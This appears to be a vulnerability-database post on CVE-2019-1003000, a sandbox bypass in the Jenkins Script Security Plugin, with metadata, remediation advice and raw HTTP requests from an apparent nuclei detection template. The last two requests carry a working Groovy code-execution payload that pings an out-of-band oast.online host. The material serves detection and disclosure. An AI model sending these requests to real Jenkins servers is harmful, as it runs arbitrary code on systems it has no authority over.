---
layout: post
cve_id: CVE-2019-1003000
title: Jenkins Script Security Plugin <=1.49 - Sandbox Bypass
pcap: true
pcap_path: /pcaps/2019/CVE-2019-1003000.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-1003000.yaml
snort2_rule: N/A
snort3_rule: N/A
author: sttlr
severity: high
impact: 'Attackers with permission to submit sandboxed scripts can bypass sandbox
  protections and execute arbitrary code on the Jenkins master JVM, potentially compromising
  the entire Jenkins environment and all managed systems.

  '
remediation: 'Upgrade to Jenkins Script Security Plugin version 1.50 or later.

  '
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2019-1003000
  epss-score: 0.94441
  epss-percentile: 0.99989
  cpe: cpe:2.3:a:jenkins:script_security::::::jenkins::*
reference:
- https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266
- http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_metaprogramming
- https://github.com/slowmistio/CVE-2019-1003000-and-CVE-2018-1999002-Pre-Auth-RCE-Jenkins
- https://github.com/1NTheKut/CVE-2019-1003000_RCE-DETECTION
- https://github.com/purple-WL/Jenkins_CVE-2019-1003000
- https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
metadata:
  verified: true
  max-request: 6
  vendor: jenkins
  product: script_security
tags:
- cve
- cve2019
- jenkins
- oast
- bypass
- sandbox-bypass
- authenticated
- vkev
- vuln
---

## ðŸ” Vulnerability Description
A sandbox bypass vulnerability exists in the Jenkins Script Security Plugin (versions 1.49 and earlier) within src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java. This flaw allows attackers with permission to submit sandboxed scripts to execute arbitrary code on the Jenkins master JVM, potentially compromising the entire Jenkins environment.


## ðŸŒ HTTP Request
```nohighlight
GET /login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /j_acegi_security_check HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Safari/605.1.15
Connection: close
Content-Length: 59
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

j_username=fasfhK&j_password=RWnCsE&from=%2F&Submit=Sign+in
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /securityRealm/user/fasfhk/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20uHyfhjni{public%20uHyfhjni(){%22ping%20-c%202%20d5ivkdple0o4ja26q7u0xs58q9xqbkdqn.oast.online%22.execute()}} HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /securityRealm/user/fasfhk/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20uHyfhjni{public%20uHyfhjni(){%22ping%20-n%202%20d5ivkdple0o4ja26q7u0uhxq49daiwdjz.oast.online%22.execute()}} HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.13 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

